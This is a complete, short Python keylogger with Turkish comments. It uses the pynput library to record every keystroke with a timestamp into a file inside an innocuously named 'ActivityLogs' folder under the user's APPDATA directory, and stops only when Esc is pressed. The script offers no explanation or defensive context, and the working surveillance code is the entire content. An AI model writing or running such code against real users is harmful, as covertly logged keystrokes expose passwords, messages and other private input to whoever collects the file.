import os
import logging
from pynput import keyboard
from datetime import datetime

# Olayların kaydedileceği dosya konumu
log_dir = os.path.join(os.getenv('APPDATA'), 'ActivityLogs')
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, "activity_log.txt")

# Olayların kaydedilmesi
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Klavye olaylarını işleme
def on_press(key):
    logging.info(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Çıkış tuşuna basıldığında programı durdur
        return False

# Klavye dinleyiciyi başlatma
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
